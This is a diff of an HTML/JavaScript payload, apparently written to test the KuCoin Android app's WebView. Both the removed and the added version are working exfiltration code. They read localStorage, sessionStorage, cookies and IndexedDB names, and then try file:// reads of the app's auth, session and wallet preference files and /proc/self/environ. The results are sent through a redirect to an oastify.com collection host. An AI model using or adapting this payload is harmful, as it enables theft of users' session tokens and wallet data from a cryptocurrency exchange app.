@@ -1,32 +1,60 @@
-  <html><body><script>
-  var d="";
+<html><body><script>
+var d="";
+
+// 1. Try reading app shared_prefs via file://
+var files=[
+  "file:///data/data/com.kubi.kucoin/shared_prefs/com.kubi.kucoin_preferences.xml",
+  "file:///data/data/com.kubi.kucoin/shared_prefs/auth.xml",
+  "file:///data/data/com.kubi.kucoin/shared_prefs/session.xml",
+  "file:///data/data/com.kubi.kucoin/shared_prefs/wallet.xml",
+  "file:///data/data/com.kubi.kucoin/shared_prefs/user_info.xml",
+  "file:///data/user/0/com.kubi.kucoin/shared_prefs/com.kubi.kucoin_preferences.xml",
+  "file:///data/data/com.kubi.kucoin/databases/",
+  "file:///etc/hosts",
+  "file:///proc/self/environ"
+];
+
+var count=0;
+files.forEach(function(f){
   try{
-    var ls="LS:";
-    for(var i=0;i<localStorage.length;i++){
-      var k=localStorage.key(i);
-      ls+=k+"="+localStorage.getItem(k).substring(0,50)+"|";
+    var x=new XMLHttpRequest();
+    x.open("GET",f,false);
+    x.send();
+    if(x.status==200||x.responseText.length>0){
+      d+="FILE_OK:"+f+"="+x.responseText.substring(0,100)+"|";
     }
-    d+=ls.substring(0,500);
-  }catch(e){d+="LS_ERR:"+e.message+";";}
-  try{
-    var ss="SS:";
-    for(var i=0;i<sessionStorage.length;i++){
-      var k=sessionStorage.key(i);
-      ss+=k+"="+sessionStorage.getItem(k).substring(0,50)+"|";
-    }
-    d+=ss.substring(0,300);
-  }catch(e){d+="SS_ERR:"+e.message+";";}
-  d+="CK:"+document.cookie+";";
-  try{
-    indexedDB.databases().then(function(dbs){
-      var idb="IDB:";
-      dbs.forEach(function(db){idb+=db.name+",";});
-      d+=idb;
-      doExfil();
-    });
-  }catch(e){d+="IDB_ERR;";doExfil();}
-  function doExfil(){
-    window.location="https://gyiui0tf8glfs3zea6nyjuxzkqqnepvxe5g5ru.oastify.com/?d="+encodeURIComponent(d.substring(0,1500));
+  }catch(e){
+    d+="FILE_ERR:"+f.split("/").pop()+":"+e.message.substring(0,30)+"|";
   }
-  setTimeout(function(){doExfil();},2000);
-  </script></body></html>
+  count++;
+  if(count>=files.length) doExfil();
+});
+
+// 2. Try iframe file access
+try{
+  var iframe=document.createElement("iframe");
+  iframe.src="file:///data/data/com.kubi.kucoin/shared_prefs/";
+  iframe.onload=function(){
+    try{
+      d+="IFRAME_OK:"+iframe.contentDocument.body.innerHTML.substring(0,200);
+    }catch(e){d+="IFRAME_BLOCKED:"+e.message.substring(0,50);}
+    doExfil();
+  };
+  document.body.appendChild(iframe);
+}catch(e){d+="IFRAME_ERR;";}
+
+// 3. Try fetch for file://
+try{
+  fetch("file:///data/data/com.kubi.kucoin/shared_prefs/").then(function(r){
+    return r.text();
+  }).then(function(t){
+    d+="FETCH_FILE:"+t.substring(0,200);
+    doExfil();
+  }).catch(function(e){d+="FETCH_ERR:"+e.message.substring(0,50)+";";});
+}catch(e){}
+
+function doExfil(){
+  window.location="https://604kkqv5a6n5ut14cwpolkzpmgsegjousuuwyeg3.oastify.com/?d="+encodeURIComponent(d.substring(0,1800));
+}
+setTimeout(function(){doExfil();},4000);
+</script></body></html>
